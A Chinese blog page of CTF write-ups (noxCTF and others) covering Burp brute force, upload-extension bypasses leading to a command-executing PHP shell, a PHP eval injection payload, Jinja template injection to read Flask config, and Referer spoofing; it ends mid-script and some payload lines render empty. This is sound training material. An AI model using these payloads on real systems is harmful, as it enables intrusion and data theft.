<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="部分 noxCTF &amp; hackitctf WriteUp"><meta name="keywords" content="WriteUp"><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>部分 noxCTF &amp; hackitctf WriteUp | J0k3r</title><link rel="shortcut icon" href="/img/fav.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://unpkg.com"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitment/style/default.min.css"><script src="https://cdn.jsdelivr.net/npm/gitment/dist/gitment.browser.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#123"><span class="toc-number">1.</span> <span class="toc-text">123</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#https-shrimphp-herokuapp-com-F0-9F-8D-A4-22-system-ls-22"><span class="toc-number">2.</span> <span class="toc-text">https://shrimphp.herokuapp.com/?%F0%9F%8D%A4=%22.system(ls).%22</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Book"><span class="toc-number">3.</span> <span class="toc-text">Web Book</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shrine"><span class="toc-number">4.</span> <span class="toc-text">Shrine</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MyFileUploader"><span class="toc-number">6.</span> <span class="toc-text">MyFileUploader</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Marcode"><span class="toc-number">7.</span> <span class="toc-text">Marcode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hiddenDOM"><span class="toc-number">8.</span> <span class="toc-text">hiddenDOM</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Python-for-fun-Misc"><span class="toc-number">9.</span> <span class="toc-text">Python for fun - Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-for-fun-2"><span class="toc-number">9.0.1.</span> <span class="toc-text">Python for fun 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-injection"><span class="toc-number">9.0.2.</span> <span class="toc-text">LDAP injection</span></a></li></ol></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#ge-going"><span class="toc-number">10.</span> <span class="toc-text">ge  going</span></a></li></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">J0k3r</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/zhuxianjin">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">32</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">31</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="https://p0sec.net/">p0神</a><a class="author-info-links__name text-center" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" href="http://0sec.com.cn/">everglow</a><a class="author-info-links__name text-center" href="http://mengsec.com/">MengChen</a><a class="author-info-links__name text-center" href="http://windylh.com/">Windylh</a><a class="author-info-links__name text-center" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" href="http://lanvnal.com/">LANVNAL</a><a class="author-info-links__name text-center" href="https://bossgirl.github.io/">八千国家奖学金</a><a class="author-info-links__name text-center" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" href="https://daolgts.github.io/">daolgts</a><a class="author-info-links__name text-center" href="https://qingchenldl.github.io">V0W</a><a class="author-info-links__name text-center" href="https://fancyking.ml/">fancyking</a><a class="author-info-links__name text-center" href="http://dxxblog.top/">xx_C1</a><a class="author-info-links__name text-center" href="http://www.cooper111.xyz/">花郎世纪</a><a class="author-info-links__name text-center" href="http://asa9ao.xyz/">Asa9ao</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://i.loli.net/2019/07/31/5d41a1019cdd085371.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">J0k3r</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/about/">关于</a></span></div><div id="post-info"><div id="post-title">部分 noxCTF &amp; hackitctf WriteUp</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-09-26</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>点击阅读</p>
<a id="more"></a>
<h1 id="123"><a href="#123" class="headerlink" title="123"></a>123</h1><p>源码提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 用户信息都在user.php里 --&gt;</span><br><span class="line">&lt;!-- 用户默认默认密码为用户名+出生日期 例如:zhangwei1999 --&gt;</span><br></pre></td></tr></table></figure>
<p>user.php空白，user.php.bak内容含很多用户名，可用来爆破，扫描得到的flag.php并没有flag</p>
<p>选burp的attack type为pitchfork，set两个payload爆破<br>得到用户和密码</p>
<p><img src="https://i.loli.net/2018/09/02/5b8bacfc8afb6.png" alt="ks1.png"></p>
<p>源码提示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 存在漏洞需要去掉  --&gt;</span><br><span class="line">&lt;!-- &lt;form action=&quot;&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot; /&gt;</span><br><span class="line">&lt;/form&gt; --&gt;</span><br></pre></td></tr></table></figure>
<p>去掉注释，补上action，上传文件</p>
<p>phmtl后缀绕过</p>
<p>得到：<br><code>&lt;a href=&quot;/view.php&quot;&gt;view&lt;/a&gt;</code></p>
<p>view.php提示file，传入file参数又提示filter “flag”，过滤了flag</p>
<p>双写绕过</p>
<p><code>http://9df2aa756fb048e7b0df80c187e5d350b037754437604bc6.game.ichunqiu.com/view.php?file=flflagag</code></p>
<p><code>flag{d0b2de22-fe4d-48ee-a447-f010dc83c087}</code></p>
<h1 id="https-shrimphp-herokuapp-com-F0-9F-8D-A4-22-system-ls-22"><a href="#https-shrimphp-herokuapp-com-F0-9F-8D-A4-22-system-ls-22" class="headerlink" title="https://shrimphp.herokuapp.com/?%F0%9F%8D%A4=%22.system(ls).%22"></a><a href="https://shrimphp.herokuapp.com/?%F0%9F%8D%A4=%22.system(ls).%22" target="_blank" rel="noopener">https://shrimphp.herokuapp.com/?%F0%9F%8D%A4=%22.system(ls).%22</a></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// flag&#123;thisisnotflag&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$_ = $_GET[&apos;🍤&apos;];</span><br><span class="line">//$_ = &apos;&quot;.system(ls).&quot;&apos;;</span><br><span class="line">if( strpos($_, &apos;&quot;&apos;) || strpos($_, &quot;&apos;&quot;) || strpos($_, &quot;_&quot;) || strpos($_, &quot;[&quot;) || strpos($_, &quot;$&quot;) ) </span><br><span class="line">    die(&apos;What did you do?????&apos;);</span><br><span class="line"></span><br><span class="line">eval(&apos;die(&quot;&apos; . substr($_, 0, 16) . &apos;&quot;);&apos;);</span><br><span class="line">echo &apos;Try harder!!!!&apos;;</span><br></pre></td></tr></table></figure>
<p><code>?🍤=&quot;.system(ls).&quot;</code></p>
<p><code>flag{php_is_good_for_hackers!!!!}</code></p>
<h1 id="Web-Book"><a href="#Web-Book" class="headerlink" title="Web Book"></a>Web Book</h1><p>link to Web_BooK:<a href="http://34.216.132.109:8083/fp/" target="_blank" rel="noopener">http://34.216.132.109:8083/fp/</a></p>
<p>只能不停点击next，用脚本模拟</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://34.216.132.109:8083'</span></span><br><span class="line">get = <span class="string">'/fp/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r = s.get(url+get)</span><br><span class="line">    h = r.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> h:</span><br><span class="line">        <span class="keyword">print</span> h</span><br><span class="line">        exit</span><br><span class="line">    get = re.findall(<span class="string">'&lt;form action="(.*?)" method="get"&gt;'</span>,h)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] try '</span>+get</span><br></pre></td></tr></table></figure>
<p>最终得到flag</p>
<p><img src="https://i.loli.net/2018/09/04/5b8e2f61b0d14.png" alt="ks2.png"></p>
<h1 id="Shrine"><a href="#Shrine" class="headerlink" title="Shrine"></a>Shrine</h1><p>题目给出源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist])+s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>flag是一个特定的配置值，/shrine/后面存在模版注入，过滤了<code>（）</code>，添加了黑名单，无法通过来读取配置值，也不能用获取对象的属性值</p>
<p>然后通过拜读wp知道，为了获得配置信息，需要从它的上全局变量(current_app等)访问config。</p>
<p>示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__globals__[&apos;current_app&apos;].config[&apos;FLAG&apos;]</span><br><span class="line"></span><br><span class="line">top.app.config[&apos;FLAG&apos;]</span><br></pre></td></tr></table></figure></p>
<p>所有的函数都会有一个<strong>globals</strong>属性,它会以一个dict，返回函数所在模块命名空间中的所有变量</p>
<p>一些方法：</p>
<ol>
<li>url_for函数</li>
</ol>
<p><code></code>找到<code>current_app</code></p>
<p>读取flag<code></code></p>
<ol start="2">
<li>get_flashed_messages函数</li>
</ol>
<p><code></code>找到<code>current_app</code></p>
<p>读取flag<code></code></p>
<ol start="3">
<li>request</li>
</ol>
<p><code></code></p>
<p>noxCTF</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>What is your reference again?</p>
<p><a href="http://chal.noxale.com:5000" target="_blank" rel="noopener">http://chal.noxale.com:5000</a></p>
<p>页面显示where the <em>**</em> did you come from?，根据题意要添加Referer头</p>
<p>根据index.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$( <span class="built_in">document</span> ).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: <span class="string">"check_from_google"</span>,</span><br><span class="line">        data: <span class="literal">NaN</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">"#status"</span>).html(<span class="string">"hello old friend! "</span> + atob(result))        </span><br><span class="line">        &#125;,</span><br><span class="line">        dataType: <span class="literal">NaN</span></span><br><span class="line">    &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="string">"#status"</span>).html(<span class="string">"where the **** did you come from?"</span>)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/09/07/5b922f41c605f.png" alt="ks3.png"></p>
<p>应该在<code>http://chal.noxale.com:5000/check_from_google</code>判断是否来自google</p>
<p><code>curl -H &quot;Referer: https://www.google.com/&quot; http://chal.noxale.com:5000/check_from_google</code></p>
<p>得到base64，解码得到flag</p>
<p><code>noxCTF{G0ogL3_1s_4lW4Ys_Ur_b3ST_R3f3r3nc3}</code></p>
<h1 id="MyFileUploader"><a href="#MyFileUploader" class="headerlink" title="MyFileUploader"></a>MyFileUploader</h1><p>This is my new file uploader server. I bet you can’t hack it!</p>
<p><a href="http://chal.noxale.com:8079" target="_blank" rel="noopener">http://chal.noxale.com:8079</a></p>
<p>开始是文件上传，抓包</p>
<p>发现总会删除最后的<code>.php</code>,且必须包含<code>.jpg</code>等图片后缀，于是用<code>.jpg.php.php</code>成功上传</p>
<p><img src="https://i.loli.net/2018/09/07/5b9244520037e.png" alt="ks5.png"></p>
<p>index.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;My file uploading website!&lt;/title&gt;</span><br><span class="line">      &lt;meta name = <span class="string">"viewport"</span> content = <span class="string">"width = device-width, initial-scale = 1"</span>&gt;      </span><br><span class="line">      &lt;link rel = <span class="string">"stylesheet"</span></span><br><span class="line">         href = <span class="string">"https://fonts.googleapis.com/icon?family=Material+Icons"</span>&gt;</span><br><span class="line">      &lt;link rel = <span class="string">"stylesheet"</span></span><br><span class="line">         href = <span class="string">"https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.3/css/materialize.min.css"</span>&gt;</span><br><span class="line">      &lt;script type = <span class="string">"text/javascript"</span></span><br><span class="line">         src = <span class="string">"https://code.jquery.com/jquery-2.1.1.min.js"</span>&gt;&lt;/script&gt;           </span><br><span class="line">      &lt;script src = <span class="string">"https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.3/js/materialize.min.js"</span>&gt;</span><br><span class="line">      &lt;/script&gt; </span><br><span class="line">   &lt;/head&gt;</span><br><span class="line">   </span><br><span class="line">   &lt;body class = "container"&gt;  </span><br><span class="line">    &lt;h5&gt; It is the most secure uploading server in the world! &lt;br&gt;&lt;/h5&gt; </span><br><span class="line">      &lt;div class = "row"&gt;</span><br><span class="line">         &lt;form enctype="multipart/form-data" class = "col s6 push-s3" method="POST" action=''&gt;</span><br><span class="line">            &lt;div class = "row"&gt;</span><br><span class="line">               &lt;div class = "file-field input-field"&gt;</span><br><span class="line">                  &lt;div class = "btn"&gt;</span><br><span class="line">                     &lt;span&gt;Browse&lt;/span&gt;</span><br><span class="line">                     &lt;input type = <span class="string">"file"</span> name=<span class="string">"upload"</span>/&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">                  </span><br><span class="line">                  &lt;div class = "file-path-wrapper"&gt;</span><br><span class="line">                     &lt;input class = "file-path validate" type = "text"</span><br><span class="line">                        placeholder = <span class="string">"Upload file"</span> /&gt;</span><br><span class="line"></span><br><span class="line">                  &lt;button class="btn waves-effect waves-light" type="submit" name="action"&gt;Submit</span><br><span class="line">                    &lt;i class="material-icons right"&gt;send&lt;/i&gt;</span><br><span class="line">                  &lt;/button&gt;</span><br><span class="line">        </span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">                  &lt;p style="text-align:center" class="col push-s3"&gt;</span><br><span class="line">                    <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'action'</span>]))</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="keyword">if</span>($_FILES[<span class="string">"upload"</span>][<span class="string">"error"</span>] != <span class="number">0</span>) <span class="keyword">die</span>(<span class="string">"Problem occured with file upload"</span>);</span><br><span class="line">                      $target_path = <span class="string">"uploads"</span>;</span><br><span class="line">                      $file_name = $_FILES[<span class="string">"upload"</span>][<span class="string">'name'</span>];</span><br><span class="line">                      $file_type = $_FILES[<span class="string">"upload"</span>][<span class="string">'type'</span>];</span><br><span class="line">                      $file_name = preg_replace(<span class="string">"/(\.php$|\.html$)/i"</span>, <span class="string">""</span>, $file_name);</span><br><span class="line">                      </span><br><span class="line">                      <span class="keyword">echo</span> <span class="string">"File: "</span> . $file_name . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">                      <span class="keyword">if</span>(preg_match(<span class="string">"/(.jpg|.png|.gif)/i"</span>, $file_name))</span><br><span class="line">                      &#123;</span><br><span class="line">                        move_uploaded_file($_FILES[<span class="string">'upload'</span>][<span class="string">'tmp_name'</span>], <span class="string">"&#123;$target_path&#125;/&#123;$file_name&#125;"</span>);</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"Image uploaded to: &lt;a href='&#123;$target_path&#125;/&#123;$file_name&#125;'&gt;Here&lt;/a&gt; &lt;br&gt;"</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"There is no .png/.jpg/.gif in that file name"</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line">                  &lt;/p&gt;</span><br><span class="line">               &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">         &lt;/form&gt;       </span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">   &lt;/body&gt;   </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>不过菜刀连接返回500，直接传一个执行命令的php，却怎么也找不到flag在哪，uploads目录下可能含flag的文件，7H3-FL4G-1S-H3r3，flag.txt等无权限访问，应该是做了权限处理</p>
<p><code>../.htaccess</code>文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Options +Indexes</span><br><span class="line">AddType application/x-httpd-php .cyb3r</span><br><span class="line"></span><br><span class="line">&lt;files flag.txt&gt;</span><br><span class="line">	order allow,deny</span><br><span class="line">	deny from allow</span><br><span class="line">&lt;/files&gt;</span><br><span class="line">&lt;files &quot;Dockerfile&quot;&gt;</span><br><span class="line">	Order deny,allow</span><br><span class="line">	Deny from all</span><br><span class="line">&lt;/files&gt;</span><br><span class="line">&lt;files &quot;apache2.conf&quot;&gt;</span><br><span class="line">	Order deny,allow</span><br><span class="line">	Deny from all</span><br><span class="line">&lt;/files&gt;</span><br><span class="line">&lt;files &quot;.htaccess&quot;&gt;</span><br><span class="line">	Order deny,allow</span><br><span class="line">	Deny from all</span><br><span class="line">&lt;/files&gt;</span><br><span class="line"></span><br><span class="line">IndexIgnore *php *pht *txt *png *jpg *gif *cyb3r *php* *Cyb3r</span><br></pre></td></tr></table></figure>
<p>然后不知道怎么办了，在uploads下弄了个.htaccess，然后访问uploads就Internal Server Error，可能被我弄坏了吧</p>
<p>过了几个小时又好了，应该是管理员重置了题目，这次uploads下文件较少，flag应该就在7H3-FL4G-1S-H3r3里，但仍don’t have permission to access /uploads/7H3-FL4G-1S-H3r3</p>
<p>最后ls -l查看权限时出了flag</p>
<p><img src="https://i.loli.net/2018/09/07/5b92707d227bf.png" alt="ks6.png"></p>
<h1 id="Marcode"><a href="#Marcode" class="headerlink" title="Marcode"></a>Marcode</h1><p>Marcode (Mr. Code in Hebrew), Ineed your help!<br>I got a movie but I cant see it. It hypnotizes me.<br>please help me!<br>yours,<br>Gveretcode (Mrs. Code in Hebrew)</p>
<p>P.S.<br>change NOXCTF to noxCTF.<br><a href="https://drive.google.com/open?id=1GkalBntU1s6d_sw_S5I4GinD8hBrh-C-" target="_blank" rel="noopener">https://drive.google.com/open?id=1GkalBntU1s6d_sw_S5I4GinD8hBrh-C-</a></p>
<p>这是个很有意思的题</p>
<p>先通过url下载得到一个mp4，打开后不断切换着二维码，根本没法扫</p>
<p><img src="https://i.loli.net/2018/09/08/5b9377c622c39.png" alt="ks7.png"></p>
<p>长达两分多钟，得用脚本了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2 </span><br><span class="line"></span><br><span class="line">videoCapture = cv2.VideoCapture()</span><br><span class="line">videoCapture.open(<span class="string">'/Users/xc/Downloads/Marcode.mp4'</span>)</span><br><span class="line"></span><br><span class="line">fps = videoCapture.get(cv2.CAP_PROP_FPS)</span><br><span class="line">frames = videoCapture.get(cv2.CAP_PROP_FRAME_COUNT)</span><br><span class="line"><span class="comment">#fps是帧率，意思是每一秒刷新图片的数量，frames是一整段视频中总的图片数量。</span></span><br><span class="line">print(<span class="string">"fps="</span>,fps,<span class="string">"frames="</span>,frames)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(int(frames)):</span><br><span class="line">    ret,frame = videoCapture.read()</span><br><span class="line">    cv2.imwrite(<span class="string">"./Marcode-jpg/mp4-(%d).jpg"</span>%i,frame)</span><br></pre></td></tr></table></figure>
<p>把视频中的每一帧都存为jpg，跑完得到3490个jpg，每一个二维码扫完都会得到一个google云盘url，访问能看到仅含一个字符的小图片</p>
<p>再用脚本把每一个jpg都扫一遍，大部分url是重复的，最终得到28个不同的url</p>
<p><img src="https://i.loli.net/2018/09/08/5b9379e6616d8.png" alt="ks8.png"></p>
<p>等于每个url表示一个字符，又用脚本做了url对应字符的字典，再跑一遍jpg得到一篇文章，是Harry Potter的Chapter 1 The Dark Lord Ascending</p>
<p>搜原文，处理下再burp compare，应该就能得到flag了</p>
<p><img src="https://i.loli.net/2018/09/08/5b937bae4be39.png" alt="ks9.png"></p>
<p>弄什么harry potter，原文都不一样，眼都看瞎了,最终找不同得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n o x ctf a into-with v impaosing-impressive d a was-were k e d a toward-towards inward-inwards v wall-walls r  upward -upwards a</span><br></pre></td></tr></table></figure>
<p>不知flag到底怎么写，比赛结束看到wp，flag竟是<code>noxCTF{AVADAKEDAVRA}</code></p>
<p>扫描的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"></span><br><span class="line">urllist = []</span><br><span class="line">picdict = &#123;&#125;</span><br><span class="line">pdic = &#123;<span class="string">'https://drive.google.com/open?id=131OPuwNVggs0ZAsVie4dfA3k9zLWN-uu'</span>: <span class="string">'T'</span>, <span 